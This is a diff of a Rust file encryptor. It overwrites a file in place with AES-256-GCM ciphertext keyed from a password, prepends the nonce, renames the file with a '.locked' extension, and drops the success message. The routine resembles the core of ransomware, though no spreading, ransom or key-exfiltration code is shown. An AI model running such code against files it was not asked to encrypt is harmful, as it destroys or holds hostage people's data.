@@ -1,12 +1,12 @@
 use aes_gcm::{
     aead::{Aead, AeadCore, KeyInit, OsRng},
-    Aes256Gcm, Nonce, Key
+    Aes256Gcm, Key
 };
 
 use sha2::{Digest, Sha256};
 use std::{fs, fs::OpenOptions, path::Path};
 use std::env;
-use std::io::{BufReader, Read, Write, Result, Error, ErrorKind};
+use std::io::{BufReader, Read, Write};
 
 
 
@@ -66,7 +66,7 @@ fn main() {
 fn encrypt_file(path: &Path, password: &str) {
     
     // Read the file into a buffer
-    let mut buffer = read_file_to_buffer(path);
+    let buffer = read_file_to_buffer(path);
 
     // Encrypt the buffer
     let key = string_to_key(password);
@@ -75,8 +75,24 @@ fn encrypt_file(path: &Path, password: &str) {
     // Write the encrypted buffer back to the file
     write_buffer_to_file(path, &encrypted_buffer);
 
+    // Rename the file to have a .locked extension
     fs::rename(path, format!("{}.{}", path.display(), EXTENSION)).unwrap();
-    println!("File encrypted successfully!");
+}
+
+fn encrypt_buffer(key: &Key<Aes256Gcm>, buffer: &Vec<u8>) -> Vec<u8> {
+    
+    // Create a new AES-256-GCM cipher instance
+    let cipher = Aes256Gcm::new(&key);
+    
+    let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits; unique per message
+
+    let mut result = nonce.to_vec();
+    let mut ciphertext = cipher.encrypt(&nonce, buffer.as_ref()).unwrap();
+
+    // Prepend the nonce to the ciphertext
+    result.append(&mut ciphertext);
+
+    return result;
 }
 
 fn write_buffer_to_file(path: &Path, buffer: &Vec<u8>) {
@@ -108,18 +124,6 @@ fn read_file_to_buffer(path: &Path) -> Vec<u8> {
     reader.read_to_end(&mut buffer).unwrap();
 
     return buffer;
-}
-
-fn encrypt_buffer(key: &Key<Aes256Gcm>, buffer: &Vec<u8>) -> Vec<u8> {
-    
-    // Create a new AES-256-GCM cipher instance
-    let cipher = Aes256Gcm::new(&key);
-    
-    let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits; unique per message
-
-    let ciphertext = cipher.encrypt(&nonce, buffer.as_ref()).unwrap();
-
-    return ciphertext;
 }
 
 fn string_to_key(input: &str) -> Key<Aes256Gcm> {
